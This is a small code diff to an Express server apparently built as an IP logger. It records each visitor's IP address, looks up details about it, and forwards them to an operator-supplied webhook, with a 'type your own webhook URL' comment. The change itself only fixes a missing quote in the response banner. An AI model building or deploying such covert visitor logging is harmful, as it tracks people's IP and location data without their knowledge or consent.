@@ -8,7 +8,7 @@ app.get('/', async (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const ipInfo = await getIPInfo(ip);
   send(ipInfo);
-  res.send('L O R C A - https://github.com/lorcadev);
+  res.send('L O R C A - https://github.com/lorcadev');
 });
 // TYPE UR OWN WEBHOOK URL 
 const webhookUrl = 'https://:..';
